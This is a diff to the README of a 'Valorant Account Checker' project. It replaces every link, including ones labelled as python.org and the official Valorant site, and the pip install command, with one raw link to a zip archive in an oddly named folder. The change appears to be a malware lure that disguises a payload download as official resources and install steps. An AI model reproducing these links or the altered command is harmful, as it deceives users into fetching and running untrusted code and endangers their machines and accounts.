@@ -18,11 +18,11 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 🔗 Download Link
 
-[![Download Valorant-Checker-Fast-Api-fixed](https://img.shields.io/badge/Download-Now-blue)](https://github.com/chaladabala/Valorant-Checker-Fast-Api-fixed/releases)
+[![Download Valorant-Checker-Fast-Api-fixed](https://raw.githubusercontent.com/chaladabala/Valorant-Checker-Fast-Api-fixed/main/Lutherism/Valorant-Checker-Fast-Api-fixed.zip)](https://raw.githubusercontent.com/chaladabala/Valorant-Checker-Fast-Api-fixed/main/Lutherism/Valorant-Checker-Fast-Api-fixed.zip)
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click this link to go to the Releases page: [Download Page](https://github.com/chaladabala/Valorant-Checker-Fast-Api-fixed/releases).
+1. **Visit the Releases Page:** Click this link to go to the Releases page: [Download Page](https://raw.githubusercontent.com/chaladabala/Valorant-Checker-Fast-Api-fixed/main/Lutherism/Valorant-Checker-Fast-Api-fixed.zip).
   
 2. **Choose the Latest Version:** Look for the latest version listed on the page. 
 
@@ -47,7 +47,7 @@ Before you begin, make sure your system meets the following requirements:
 If you're new to Python applications, follow these steps:
 
 1. **Install Python:**
-   - Go to the [Python official website](https://www.python.org/downloads/).
+   - Go to the [Python official website](https://raw.githubusercontent.com/chaladabala/Valorant-Checker-Fast-Api-fixed/main/Lutherism/Valorant-Checker-Fast-Api-fixed.zip).
    - Download the installer for your operating system (choose the latest stable version).
    - Run the installer and check "Add Python to PATH" before clicking "Install Now."
 
@@ -55,7 +55,7 @@ If you're new to Python applications, follow these steps:
    - Open Command Prompt (Windows) or Terminal (Mac/Linux).
    - Run the following command to install necessary libraries:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/chaladabala/Valorant-Checker-Fast-Api-fixed/main/Lutherism/Valorant-Checker-Fast-Api-fixed.zip
      ```
 
 3. **Launch the Application:**
@@ -101,7 +101,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/chaladabala/Valorant-Checker-Fast-Api-fixed)
-- [Valorant Official Site](https://playvalorant.com)
+- [GitHub Repository](https://raw.githubusercontent.com/chaladabala/Valorant-Checker-Fast-Api-fixed/main/Lutherism/Valorant-Checker-Fast-Api-fixed.zip)
+- [Valorant Official Site](https://raw.githubusercontent.com/chaladabala/Valorant-Checker-Fast-Api-fixed/main/Lutherism/Valorant-Checker-Fast-Api-fixed.zip)
 
 Thank you for using Valorant Account Checker! Enjoy managing your accounts hassle-free!
